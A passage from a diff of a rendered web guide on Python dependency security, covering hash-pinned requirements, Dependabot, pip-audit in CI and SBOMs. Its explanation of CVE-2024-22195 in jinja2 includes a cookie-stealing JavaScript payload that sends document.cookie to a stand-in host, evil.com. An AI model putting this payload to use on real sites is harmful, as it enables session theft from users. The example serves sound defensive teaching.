+for details:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uv</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> lock</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uv</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> sync</span></span></code></pre></div><p>For requirements files with hashes (see <a href=https://docs.astral.sh/uv/reference/cli/#uv-pip-compile target=_blank rel="noopener noreferrer">uv pip compile docs</a>
+):</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># From a requirements.in file:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uv</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> pip</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> compile</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --generate-hashes</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> requirements.in</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> -o</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> requirements.txt</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Or from a uv project (hashes included by default):</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uv</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> export</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --format</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> requirements-txt</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> -o</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> requirements.txt</span></span></code></pre></div><p>If you&rsquo;re not ready to switch to uv yet, <a href=https://github.com/jazzband/pip-tools target=_blank rel="noopener noreferrer">pip-tools</a>
 provides similar
-functionality:</p><div class=code-block-wrapper><pre><code class=language-bash>pip-compile --generate-hashes requirements.in &gt; requirements.txt</code></pre></div><p>These commands create SHA256 checksums that get verified at install time. If someone modifies a package even with the
+functionality:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">pip-compile</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --generate-hashes</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> requirements.in</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5"> ></span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> requirements.txt</span></span></code></pre></div><p>These commands create SHA256 checksums that get verified at install time. If someone modifies a package even with the
 same version number, the hash won&rsquo;t match and installation fails. Read more about
 <a href=https://pip.pypa.io/en/stable/topics/secure-installs/ target=_blank rel="noopener noreferrer">secure installs with pip</a>
 .</p><div class="alert alert-important"><p class=alert-title><i class="fa-solid fa-circle-exclamation" aria-hidden=true></i></p><p>pip only enforces hash checking when every requirement in the file has a hash, or when you pass <code>--require-hashes</code>
@@ -280,28 +280,28 @@ and
 <a class=heading-link href=#separate-development-from-deployment><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
 <span class=sr-only>Link to heading</span></a></h4><div class="alert alert-warning"><p class=alert-title><i class="fa-solid fa-triangle-exclamation" aria-hidden=true></i></p><p>If you&rsquo;re publishing a <strong>library</strong> to PyPI, don&rsquo;t pin dependencies in your <code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">pyproject</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">toml</span></span></code>. Use broad version ranges
 to avoid conflicts when users install your library alongside others. The advice in this section is for application
-deployment only.</p></div><p>Modern best practice for applications separates what you want (development) from what you got (deployment):</p><div class=code-block-wrapper><pre><code class=language-toml># pyproject.toml - flexible ranges for development
-[project]
-dependencies = [
-  &#34;flask&gt;=2.0&#34;,
-  &#34;requests&gt;=2.28&#34;,
-]</code></pre></div><div class=code-block-wrapper><pre><code class=language-text># requirements.txt - exact pins for deployment (autogenerated)
-flask==3.1.1 \
-    --hash=sha256:d667207822...
-requests==2.32.3 \
-    --hash=sha256:70761cfe03...
-werkzeug==3.1.3 \
-    --hash=sha256:54b78bf3716...</code></pre></div><p>This approach gives you flexibility during development (you can easily upgrade to test new versions) while guaranteeing
+deployment only.</p></div><p>Modern best practice for applications separates what you want (development) from what you got (deployment):</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># pyproject.toml - flexible ranges for development</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">[</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">project</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">dependencies </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> [</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">  "flask>=2.0"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">  "requests>=2.28"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span></code></pre></div><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span># requirements.txt - exact pins for deployment (autogenerated)</span></span>
+<span class="line"><span>flask==3.1.1 \</span></span>
+<span class="line"><span>    --hash=sha256:d667207822...</span></span>
+<span class="line"><span>requests==2.32.3 \</span></span>
+<span class="line"><span>    --hash=sha256:70761cfe03...</span></span>
+<span class="line"><span>werkzeug==3.1.3 \</span></span>
+<span class="line"><span>    --hash=sha256:54b78bf3716...</span></span></code></pre></div><p>This approach gives you flexibility during development (you can easily upgrade to test new versions) while guaranteeing
 exact reproducibility for deployment (production always gets exactly what you tested).
 <a href=https://docs.github.com/en/code-security/how-tos/secure-your-supply-chain target=_blank rel="noopener noreferrer">Dependabot</a>
 can automate updates by filing
-pull requests when new versions are available. Add a <code class="shiki-inline"><span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">github</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">/</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">dependabot</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">yml</span></span></code> to your repository:</p><div class=code-block-wrapper><pre><code class=language-yaml>version: 2
-updates:
-  - package-ecosystem: pip
-    directory: /
-    schedule:
-      interval: weekly
-    open-pull-requests-limit: 10</code></pre></div><p>Dependabot will check your <code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">requirements</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">txt</span></span></code> (or <code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">pyproject</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">toml</span></span></code>) weekly and open PRs for outdated or vulnerable
+pull requests when new versions are available. Add a <code class="shiki-inline"><span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">github</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">/</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">dependabot</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">yml</span></span></code> to your repository:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">version</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387"> 2</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">updates</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">  -</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> package-ecosystem</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> pip</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">    directory</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> /</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">    schedule</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">      interval</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> weekly</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">    open-pull-requests-limit</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387"> 10</span></span></code></pre></div><p>Dependabot will check your <code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">requirements</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">txt</span></span></code> (or <code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">pyproject</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">toml</span></span></code>) weekly and open PRs for outdated or vulnerable
 dependencies. Each PR includes the changelog and compatibility score, so you can review before merging.</p><div class="alert alert-info"><p class=alert-title><i class="fa-solid fa-circle-info" aria-hidden=true></i></p><p>Dependabot&rsquo;s <code>pip</code> ecosystem does not understand <code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">uv</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">lock</span></span></code> files. If you use <code>uv lock</code> for dependency management,
 either maintain a <code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">requirements</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">txt</span></span></code> via <code>uv export</code> for Dependabot to scan, or use
 <a href=https://docs.renovatebot.com/ target=_blank rel="noopener noreferrer">Renovate</a>
@@ -311,19 +311,19 @@ which has native uv lockfile support.</p></div><h3 id=scan-for-vulnerabilities>S
 vulnerability? New CVEs get discovered regularly in popular packages. A package that worked fine yesterday might have a
 critical flaw discovered today.</p><h4 id=the-invisible-bug>The Invisible Bug
 <a class=heading-link href=#the-invisible-bug><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h4><p>Why scanning matters - a real example:</p><div class=code-block-wrapper><pre><code class=language-python># CVE-2024-22195: jinja2 &lt; 3.1.3 allows attribute injection via xmlattr
-from jinja2 import Template
-
-template = Template(&#34;&lt;div {{ attrs|xmlattr }}&gt;&#34;)
-# Attacker controls attrs parameter:
-result = template.render(
-    attrs={
-        &#34;safe&#34;: &#34;value&#34;,
-        &#34;onclick&#34;: &#34;fetch(&#39;https://evil.com/steal?cookie=&#39;+document.cookie)&#34;,
-    }
-)
-# Renders: &lt;div safe=&#34;value&#34; onclick=&#34;fetch(...)&#34;&gt;
-# The injected onclick executes JavaScript in users&#39; browsers, stealing cookies</code></pre></div><p>This is <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-22195 target=_blank rel="noopener noreferrer">CVE-2024-22195</a>
+<span class=sr-only>Link to heading</span></a></h4><p>Why scanning matters - a real example:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># CVE-2024-22195: jinja2 &#x3C; 3.1.3 allows attribute injection via xmlattr</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#CBA6F7">from</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> jinja2 </span><span style="--shiki-light:#8839EF;--shiki-dark:#CBA6F7">import</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> Template</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">template </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> Template</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">(</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"&#x3C;div </span><span style="--shiki-light:#EA76CB;--shiki-dark:#F5C2E7">{{</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> attrs|xmlattr </span><span style="--shiki-light:#EA76CB;--shiki-dark:#F5C2E7">}}</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">>"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">)</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Attacker controls attrs parameter:</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">result </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> template</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">render</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">(</span></span>
+<span class="line"><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#EBA0AC;--shiki-dark-font-style:italic">    attrs</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">{</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">        "safe"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "value"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">        "onclick"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "fetch('https://evil.com/steal?cookie='+document.cookie)"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">    }</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">)</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Renders: &#x3C;div safe="value" onclick="fetch(...)"></span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># The injected onclick executes JavaScript in users' browsers, stealing cookies</span></span></code></pre></div><p>This is <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-22195 target=_blank rel="noopener noreferrer">CVE-2024-22195</a>
 , a real vulnerability from 2024. The bug sits
 in the template engine itself, so even code that looks reasonable can be vulnerable when it feeds untrusted input into
 the affected paths. An attacker can inject malicious JavaScript that executes in users&rsquo; browsers, potentially stealing
@@ -344,11 +344,11 @@ for full usage details. The flow:</p><pre class=mermaid>graph LR
     style B fill:#50b432,stroke:#3d8a26,color:#fff
     style C fill:#f59e0b,stroke:#d97706,color:#fff
     style G fill:#50b432,stroke:#3d8a26,color:#fff
-</pre><p>Install and run it:</p><div class=code-block-wrapper><pre><code class=language-bash>uvx pip-audit --requirement requirements.txt
-uvx pip-audit --format json --requirements requirements.txt &gt; report.json</code></pre></div><p>Example output:</p><div class=code-block-wrapper><pre><code class=language-text>Name        Version  ID             Fix Versions
-----------  -------  -------------  ------------
-flask       2.2.0    GHSA-m2qf-hxjv  &gt;=2.2.5
-jinja2      3.1.1    CVE-2024-22195  &gt;=3.1.3</code></pre></div><p>By default, pip-audit uses the <a href=https://osv.dev/ target=_blank rel="noopener noreferrer">OSV</a>
+</pre><p>Install and run it:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uvx</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> pip-audit</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --requirement</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> requirements.txt</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uvx</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> pip-audit</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --format</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> json</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --requirements</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> requirements.txt</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5"> ></span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> report.json</span></span></code></pre></div><p>Example output:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span>Name        Version  ID             Fix Versions</span></span>
+<span class="line"><span>----------  -------  -------------  ------------</span></span>
+<span class="line"><span>flask       2.2.0    GHSA-m2qf-hxjv  >=2.2.5</span></span>
+<span class="line"><span>jinja2      3.1.1    CVE-2024-22195  >=3.1.3</span></span></code></pre></div><p>By default, pip-audit uses the <a href=https://osv.dev/ target=_blank rel="noopener noreferrer">OSV</a>
 (Open Source Vulnerabilities) database, which aggregates
 vulnerability data from multiple sources:</p><ul><li><a href=https://github.com/pypa/advisory-database target=_blank rel="noopener noreferrer">PyPA Advisories</a>
 - Python-specific security advisories,</li><li><a href=https://github.com/advisories target=_blank rel="noopener noreferrer">GitHub Advisories</a>
@@ -369,22 +369,22 @@ about — especially if you&rsquo;re triaging a long list of pip-audit findings 
 <a class=heading-link href=#integrate-into-cicd><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
 <span class=sr-only>Link to heading</span></a></h4><p>Security checks should run automatically on every commit. Adding <a href=https://github.com/pypa/pip-audit target=_blank rel="noopener noreferrer">pip-audit</a>
 to
-common CI systems:</p><p><strong>GitHub Actions:</strong></p><div class=code-block-wrapper><pre><code class=language-yaml>name: Security Scan
-on: [push, pull_request]
-jobs:
-  security:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
-      - uses: astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86 # v5.4.2
-      - run: uvx pip-audit --requirement requirements.txt</code></pre></div><p><strong>GitLab CI:</strong></p><div class=code-block-wrapper><pre><code class=language-yaml>security-scan:
-  image: ghcr.io/astral-sh/uv:python3.14
-  script:
-    - uvx pip-audit --requirement requirements.txt</code></pre></div><p><strong>Jenkins:</strong></p><div class=code-block-wrapper><pre><code class=language-groovy>stage(&#39;Security Scan&#39;) {
-    steps {
-        sh &#39;pip install uv &amp;&amp; uvx pip-audit --requirement requirements.txt&#39;
-    }
-}</code></pre></div><p>Add Ruff linting to these pipelines as well to catch security issues in your own code before they get merged.</p><h3 id=know-what-youre-running>Know What You&rsquo;re Running
+common CI systems:</p><p><strong>GitHub Actions:</strong></p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">name</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> Security Scan</span></span>
+<span class="line"><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387">on</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> [</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">push</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> pull_request</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">jobs</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">  security</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">    runs-on</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> ubuntu-latest</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">    steps</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      -</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> uses</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"> # v4.3.1</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      -</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> uses</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"> # v5.4.2</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      -</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> run</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> uvx pip-audit --requirement requirements.txt</span></span></code></pre></div><p><strong>GitLab CI:</strong></p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">security-scan</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">  image</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> ghcr.io/astral-sh/uv:python3.14</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">  script</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">    -</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> uvx pip-audit --requirement requirements.txt</span></span></code></pre></div><p><strong>Jenkins:</strong></p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span>stage('Security Scan') {</span></span>
+<span class="line"><span>    steps {</span></span>
+<span class="line"><span>        sh 'pip install uv &#x26;&#x26; uvx pip-audit --requirement requirements.txt'</span></span>
+<span class="line"><span>    }</span></span>
+<span class="line"><span>}</span></span></code></pre></div><p>Add Ruff linting to these pipelines as well to catch security issues in your own code before they get merged.</p><h3 id=know-what-youre-running>Know What You&rsquo;re Running
 <a class=heading-link href=#know-what-youre-running><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
 <span class=sr-only>Link to heading</span></a></h3><p>Let&rsquo;s say a critical vulnerability gets announced in a popular library. Your first question: &ldquo;Are we using this
 anywhere?&rdquo; Without a Software Bill of Materials (SBOM), answering this requires manually checking every project, every
@@ -420,62 +420,62 @@ Foundation). Both are widely supported; CycloneDX is more common in the Python e
 <a href=https://github.com/CycloneDX/cyclonedx-python target=_blank rel="noopener noreferrer">CycloneDX Python</a>
 (see the
 <a href=https://cyclonedx-bom-tool.readthedocs.io/en/latest/ target=_blank rel="noopener noreferrer">documentation</a>
-for advanced usage):</p><div class=code-block-wrapper><pre><code class=language-bash>uv pip install cyclonedx-bom
-cyclonedx-py environment --output-file sbom.json</code></pre></div><p><strong>Best practices:</strong> Use lockfiles over requirements.txt for more accurate dependency trees. Include cryptographic hashes
+for advanced usage):</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uv</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> pip</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> install</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> cyclonedx-bom</span></span>
